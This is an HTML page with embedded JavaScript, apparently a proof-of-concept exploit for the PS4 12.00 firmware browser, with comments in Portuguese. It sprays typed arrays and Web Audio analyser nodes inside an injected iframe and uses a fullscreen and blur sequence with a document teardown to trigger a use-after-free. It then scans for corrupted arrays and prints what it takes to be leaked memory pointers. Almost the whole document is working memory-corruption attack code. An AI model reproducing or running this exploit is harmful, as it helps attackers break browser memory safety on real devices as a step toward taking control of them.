<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 Audio Leak - Leandro</title>
</head>
<body style="background-color: #f4f4f9; font-family: sans-serif; padding: 20px;">

    <h1>PS4 12.00 - Audio Pipeline Leak</h1>
    <p>Status: <span id="status-pai" style="font-weight:bold; color: #555;">Aguardando...</span></p>

    <button onclick="prepareObjects()" style="padding: 12px;">1. Preparar Objetos (Pai)</button>
    <button onclick="setupIframe()" style="padding: 12px;">2. Injetar Iframe (Audio Spray)</button>
    <button onclick="checkPersistence()" style="padding: 12px; background-color: #c8e6c9;">3. Verificar e Vazar Ponteiros</button>

    <hr>
    <div id="leak-output" style="background: #222; color: #0f0; padding: 15px; font-family: monospace; display: none; border-radius: 5px; font-size: 11px;"></div>
    <div id="frame-container" style="margin-top: 20px;"></div>

    <script>
        const PATTERN = 2.121995791e-314; // 0x4141414141414141
        let controllers = [];
        const statusPai = document.getElementById('status-pai');
        const leakOutput = document.getElementById('leak-output');

        // PASSO 1: Mantemos a base de 5000 objetos que você estabilizou
        function prepareObjects() {
            controllers = [];
            for(let i = 0; i < 5000; i++) {
                let arr = new Float64Array(32); // Janela de 32 para ver além do cabeçalho
                arr[0] = i; 
                controllers.push(arr);
            }
            statusPai.innerText = "5000 Objetos Prontos. Memória estável.";
            statusPai.style.color = "blue";
            leakOutput.style.display = "none";
        }

        // PASSO 2: Spray de Áudio para "sujar" a RAM com ponteiros de sistema
        function setupIframe() {
            const container = document.getElementById('frame-container');
            container.innerHTML = '<iframe id="pocFrame" style="width:100%; height:150px; border:1px solid red;"></iframe>';
            const frame = document.getElementById('pocFrame');
            const fDoc = frame.contentWindow.document;

            fDoc.open();
            fDoc.write(`
                <html><body>
                    <button onclick="startAudioPoC()" style="padding:10px;">INICIAR AUDIO LEAK (FS + OPTIONS)</button>
                    <script>
                        window.startAudioPoC = function() {
                            // Gatilho de Fullscreen
                            document.documentElement.webkitRequestFullscreen();
                            
                            window.onblur = function() {
                                // SPRAY DE ÁUDIO: Isso cria ponteiros reais na RAM
                                let audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                                let nodes = [];
                                
                                for(let i = 0; i < 4000; i++) {
                                    // Criamos analisadores de áudio (objetos pesados do sistema)
                                    let node = audioCtx.createAnalyser();
                                    nodes.push(node);
                                    
                                    // Intercalamos com o spray de sucesso para causar a colisão
                                    let p = new Float64Array(32).fill(${PATTERN});
                                    nodes.push(p);
                                }

                                // Teardown para causar o Use-After-Free
                                setTimeout(() => {
                                    document.open();
                                    document.write('<h1>PIPELINE FINALIZADO</h1>');
                                    document.close();
                                }, 1000);
                            };
                        };
                    <\/script>
                </body></html>
            `);
            fDoc.close();
            statusPai.innerText = "Iframe Pronto. Use FS -> OPTIONS.";
        }

        // PASSO 3: Verificação profunda
        function checkPersistence() {
            let corrupted = null;
            let corruptedIndex = -1;

            for(let i = 0; i < controllers.length; i++) {
                if (controllers[i][0] === PATTERN) {
                    corrupted = controllers[i];
                    corruptedIndex = i;
                    break;
                }
            }

            if (corrupted) {
                statusPai.innerHTML = "<span style='color:green;'>✓ SUCESSO NO ID: " + corruptedIndex + "</span>";
                leakOutput.style.display = "block";
                leakOutput.innerHTML = "<b>[ AUDIO PIPELINE DUMP ]</b><br><br>";

                for(let i = 0; i < 32; i++) {
                    const val = corrupted[i];
                    const buf = new ArrayBuffer(8);
                    new Float64Array(buf)[0] = val;
                    const hex = new BigUint64Array(buf)[0].toString(16).padStart(16, '0');
                    
                    // Se for diferente de 0 e do padrão de 'A', é um ponteiro de áudio!
                    let isPointer = (hex !== "0000000000000000" && !hex.includes("414141"));
                    let style = isPointer ? "color:#fff; background:#a00; padding:2px;" : "";
                    
                    let br = (i % 4 === 3) ? "<br>" : "";
                    leakOutput.innerHTML += "O[" + i + "]: <span style='" + style + "'>0x" + hex + "</span> | " + br;
                }
            } else {
                statusPai.innerHTML = "<span style='color:red;'>✗ FALHA. Tente novamente ou reinicie o PS4.</span>";
            }
        }
    </script>
</body>
</html>
